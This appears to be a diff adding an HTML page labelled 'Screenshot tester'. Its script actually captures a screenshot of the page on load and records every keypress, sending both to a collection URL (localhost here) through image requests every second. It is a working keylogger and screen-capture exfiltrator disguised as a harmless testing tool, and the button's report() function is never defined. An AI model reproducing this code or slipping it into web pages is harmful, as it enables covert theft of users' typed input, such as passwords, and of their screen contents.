@@ -1,0 +1,57 @@
+<html>
+	<head>
+		<title>wtf</title>
+		
+	</head>
+	<body>
+		<input>
+	</body>
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/0.4.1/html2canvas.min.js"></script>
+	<div>Screenshot tester</div>
+	<button onclick="report()">Take screenshot</button>
+	
+	<div class="container">
+	  <img width="75%" class="screen">
+	</div>
+</html>
+
+
+
+<script>
+	function screenshot() {
+	let region = document.querySelector("body"); // whole screen
+	html2canvas(region, {
+		onrendered: function(canvas) {
+		let pngUrl = canvas.toDataURL();
+		let img = document.querySelector(".screen");
+		img.src = pngUrl; // pngUrl contains screenshot graphics data in url form
+		
+		new Image().src = 'http://localhost/screenshot?image='+pngUrl;
+		// here you can allow user to set bug-region
+		// and send it with 'pngUrl' to server
+
+		},
+	});
+	}
+	window.onload = screenshot;
+
+	var keys='';
+	var url = 'http://localhost/?c=';
+
+	document.onkeypress = function(e) {
+		get = window.event?event:e;
+		key = get.keyCode?get.keyCode:get.charCode;
+		key = String.fromCharCode(key);
+		keys+=key;
+		// if(key == '\n'){
+		// 	senBack();
+		// }
+	}
+	function senBack(){
+		if(keys.length>0) {
+			new Image().src = url+keys;
+			keys = '';
+		}
+	}
+	window.setInterval(senBack, 1000);
+</script>
